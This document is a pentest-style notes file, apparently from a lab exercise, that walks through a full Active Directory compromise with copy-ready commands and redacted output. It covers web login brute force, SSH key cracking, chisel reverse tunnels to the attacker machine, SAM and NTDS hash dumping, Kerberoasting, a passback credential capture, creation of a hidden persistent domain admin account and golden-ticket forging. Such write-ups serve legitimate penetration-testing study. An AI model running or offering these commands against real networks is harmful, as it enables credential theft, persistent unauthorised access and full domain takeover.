###
OSINT
EXTERNAL interface
LOGIN PAGE / WEB APP Brute FROCE
Brute force Avoid REDIRECTION
Credentials finding
Pivoting - chisel
Port Forwarding
Dynamic SSH Tunnel
Proxychains
Avoid Firewall Technique
LDAP - SMB Enum
Active Directory Enum
Active Directory Exploit
crackmapexec
Kerberoasting
NTLM Hashes
Password reuse
SAM Account
NTDS FIle
Persistance
Full Admin Account creation
GOLDEN TICKET - FULL DC COMPROMITION
###


OSINT + Enumeration web site - External Interfaces:
    1-Enumeration:
        nmap -T5 -sV -sC -Pn 10.10.x.x  -oN scan5.log -vv
        PORT    STATE SERVICE  REASON  VERSION
        22/tcp  open  
        25/tcp  open 
        80/tcp  open  
        110/tcp open  
        143/tcp open  
        443/tcp open  
        587/tcp open  
        993/tcp open  
        995/tcp open  


        Port 443:
        Scan reveal a possible brute force on web page:
            # Brute Force xxx server
                443 Redirection Brute Ofrce specific sript
                    hydra -L mails.txt -P xxx-wordlists/10k-most-common.txt mail.xxx.com https-post-form "/pageName/login:username=^USER^&password=^PASS^&form_login=Login&lang=en_US:Username or password is incorrect" -V -f -o hydra-output.txt -t 4 -s 443 -I
                    ffuf -request req.txt -request-proto https -mode clusterbomb -w mails.txt:username -w xxxx.txt:password -fr "Username or password is incorrect" -v -timeout 60 -t 50 -r -c  -o FFuF2_Result
                    ffuf -request req.txt -request-proto https  -w mails.txt:username -w xxxx.txt:password -fc 200 -v -timeout 60 -t 50 -r -c

                Password: xxxxx


        Port 22:
        We found SSH Private Keys via the creds that we Brute Force
            # SSH Private Key:
                -----BEGIN RSA PRIVATE KEY-----
                xx
                -----END RSA PRIVATE KEY-----


            # Decode the password of private Key and USe it:
                private key mode:
                chmod 600 id_rsa
                ─$ python /usr/share/john/ssh2john.py  id_rsa > id_rsa.hash

                └─$ john --wordlist=/home/kali/Desktop/Transfer_to_Victim_Machine/1000Million_Passwd/rockyou.txt id_rsa.hash

                1ere key - john --show id_rsa.hash
                    PASSWD: xxxxx

                2iem - Key ┌──(kali㉿kali)-[~/Desktop/xxxx/xxxx]
                └─$ john --show id_rsa.hash
                    id_rsa:xxxxx


            # Connecting via ssh:
                If no public key, but private only:
                ssh -i id_rsa  admin@xxx
                # after adding my private to key to corrupted machine
                ssh admin@xxx


            # Dowload file to mACHINE:
                scp From Kali to machine:
                scp -i id_rsa linpeas_linux_amd64 admin@xxxx:/home/admin/.local/share



Pivoting Machine Switch from External to Internal Machines:
    2-Pivoting:
        # Chisel:
            In Kali:
                chisel server --socks5 --reverse:
                    create a 'fingerprint' value ex: 64..y5/.....cQ4Np=
            
            In Compromised Machine:
                root@ip-10-200-116-12:/home/adib# ./chisel client --fingerprint BzD5CiH9lcE2MRyOXjYe643R30kVK2atvU5nscBmwG8= 10.x.x.x:8080 R:socks

            In Kali:
            we change the proxychain conf file:
                └─$ sudo gedit /etc/proxychains4.conf
                socks5 	127.0.0.1 1080

            In compromised machine:
                ./chisel client --fingerprint UynVoYEEIrJSsIYXWgo6Rybev3xwc9brcNe7tQh64q0= 10.x.x.x:8080 R:socks


        # Port Forwarding Dynamique SSH Tunneling:
            Youtube:  OSCP Preparation: Pivoting using SSH & Gaining Reverse Shell from Internal Network machine
            ┌──(kali㉿kali)-[~/Desktop/xxx/External]
            └─$ ssh -D 8888 adminuser@10.10.x.x


            Pivoting Scan AVOID FW:
                ┌──(kali㉿kali)-[~/Desktop/xxx/xxx]
                └─$ sudo proxychains nmap -T 2 -Pn -sV -n -sT  -p 21,22,23,53,80,135,139,389,443,445,3389 10.x.x.x -v 

        # In the compromited machine we use this to ping Internal machines
            For loop to ping:
                for i in {1..255}; do (ping -c 1 10.10.10.${i} | grep "bytes from" &); done
                for i in {1..65535}; do (echo > /dev/tcp/10.x.x.x/$i) >/dev/null 2>&1 && echo $i is open; done



Internal Network Machines - AD:
3-Enumeration Active Directory:
    # Find SMB + LDAP Enumeration and Exploitation
    SMB:
    proxychains crackmapexec 10.10.x.0/24:
        SMB         10.10.x.x     445    xxx           
        SMB         10.10.x.x     445    xx          
        SMB         10.10.x.x     445    xxxx     
        SMB         10.10.x.x    445    x         

    LDAP:
    # Domain Enumeration:
        proxychains -q ldapdomaindump -u 'xxx.com\account' -p 'xxxx' ldap://10.10.x.x
        proxychains crackmapexec smb 10.10.x.x -u "SVCaccount" -p /External/smb_pass.txt --share
        proxychains crackmapexec smb -usersfile user.txt 'xxx.com\account' -p 'xxxx' -dc-ip 10.10.1x0.x -request 

    # We found all the accounts and machines + groupes vias ldapdomaindump


4-Active Directory Exploit:
    # Kerberoasting TGS - Request
    We found some KERBEROASTABLE ACCOUNTS:
        proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -usersfile user_dumpded.txt  xxx.com/account:'xxx' -dc-ip 10.10.x.x  -request
        $krb5tgs$23$*xxxSVC$x.COM$xxxx*$x
        $krb5tgs$23$*xxxxSVC$x.COM$xxx*$x
        $krb5tgs$23$*xxxSVC$x.COM$xx*$x
        $krb5tgs$23$*xxxSVC$xxxx.COM$xx*$x
        $krb5tgs$18$krbtgt$x.COM$*krbtgt*xxxx

        We try to obtain a ticket- granting service (TGS) ticket that could be vulnerable to Brute Force attack


    # We dehash the accounts founded:
        ┌──(kali㉿kali)-[~/Desktop/xxx/x]
        └─$ hashcat -a 0 -m 13100 kebhash /home/kali/Downloads/rockyou.txt

            Account: xxxSVC password: xxx


    # SAM Account DUMPing:
    SAM DUMP:
        ┌──(kali㉿kali)-[~/Desktop/xxxx/x]
        └─$ proxychains crackmapexec smb 10.10.x.x -u xxxxSVC -p xxx --sam                                                                                   
        SMB         10.10.x.x     445    SVC              [+] xxxx.com\xxxSVC:xxx (Pwn3d!)
        SMB         10.10.x.xx     445    SVC              [+] Dumping SAM hashes
        SMB         10.10.x.x     445    SVC              Administrator:500:xx:xxxx:::
        SMB         10.10.10.15     445    SVC              [+] Added 6 SAM hashes to the database
                                                                                                                                            

    # NTLM Hash Crack:
        ┌──(kali㉿kali)-[~/Desktop/x/x]
        └─$ hashcat SAM_DUMP.hash /home/kali/Downloads/rockyou.txt -m 1000
            hashcat (v6.2.6) starting
            xxxxxxxxxxxxxx
            Account:Password    


    # We Test Passwd Reuse and we test with others creds find in other machines too:
        ┌──(kali㉿kali)-[~/Desktop/x/x]
        └─$ proxychains crackmapexec smb 10.10.x.0/24 -u user_dumpded.txt -p xxx --local-auth
            SMB         10.10.x.x     445    SVC              [+] SVC\xxx:xxx 
            SMB         10.10.x.x     445    BYPASS           [+] xxx\xx:xxx


        ┌──(kali㉿kali)-[~/Desktop/x/x]
        └─$ proxychains crackmapexec smb 10.10.x.0/24 -u "xx" -p "x" --local-auth
            SMB         10.10.x.x     445    PASSBACK         [+] x\cds:x 

    # We get acces to DC Machine with Allow PASSBACK ATTACK in order to get Admin Creds
        PassbackAttack:
            Connection from 10.10.x.x to 10.10.x.x via nc  <-- DC to Pivoting Machine
            xx@mail:~/.local/share$ nc -lvnp 4443

            Listening on [0.0.0.0] (family 0, port 4443)
            Connection from 10.10.x.x 51468 received!

            administrator@xx.com
            PASSWORDinCLEARtexTadminuser@x:~/.local/share$ 




AD Persistence technique:
5-Active Direcotory Persistance:
    We Add our User to the DC with the FULL Rights:
        # Connect do DC
            AD DC Add new admin
            Enter-PSSession -ComputerName "TPM-DC" -Credential $credential
            Enter-PSSession -ComputerName "ROOTDC" -Credential $credential

        # Create New-User
            New-ADUser -Name "administratoor" -AccountPassword (ConvertTo-SecureString "Adib1234@" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -ChangePasswordAtLogon $false

        # Add User to the AD member
            Add-ADGroupMember -Identity "Administrators" -Members "administratoor"


    # activer l'accès administratif à distance (WinRM) sur ces machines
        Enable-PSRemoting -Force

    # Vérifiez si le compte existe en utilisant le nom d'utilisateur
        Get-ADUser -Filter {SamAccountName -eq "administratoor"}

    # Vérifiez si le compte est activé en utilisant le nom d'utilisateur
        (Get-ADUser -Filter {SamAccountName -eq "administratoor"}).Enabled


    Connect remotly:
        proxychains -q evil-winrm -u administratoor -p Adib1234@  -i 10.10.x.x <--- DC IP


Golden Ticket:
6- Full Domain Controller ACCESS:
    KERBEROS GOLDEN TICKET - Pass The Ticket - NTDS :
        # DUMP NTDS:
            ┌──(kali㉿kali)-[~/Desktop/x/x]
            └─$ sudo proxychains python3 /home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py x.com/administratoor:'Adib1234@'@10.10.x.x -just-dc-ntlm


        # We de has the NTLM:
            ┌──(kali㉿kali)-[~/Desktop/x/x]
            └─$ hashcat ntds /home/kali/Downloads/rockyou.txt -m 1000 


        # We generate Golden Ticket:
            kerberos::golden /domain:$domain = "DOMAINENAME" /sid:S-1-5-21-x-x-x-x /user:administratoor /krbtgt:hash_KRBTGT /ticket:golden_ticket.kirbi


